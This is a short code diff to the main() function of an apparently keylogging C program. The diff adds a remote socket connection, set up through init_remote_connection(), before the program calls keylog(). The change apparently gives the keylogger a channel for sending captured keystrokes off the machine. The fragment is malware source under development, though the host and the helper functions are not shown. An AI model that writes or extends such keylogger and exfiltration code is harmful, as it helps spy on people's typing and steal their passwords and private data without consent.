@@ -25,6 +25,11 @@ int main(int ac, char **av) {
 #endif
 
     fetch_available_keyboards(&instance);
+
+    int sockfd = init_remote_connection(&instance);
+    if (sockfd < 0)
+        return 1;
+
     keylog(&instance);
     return 0;
 }
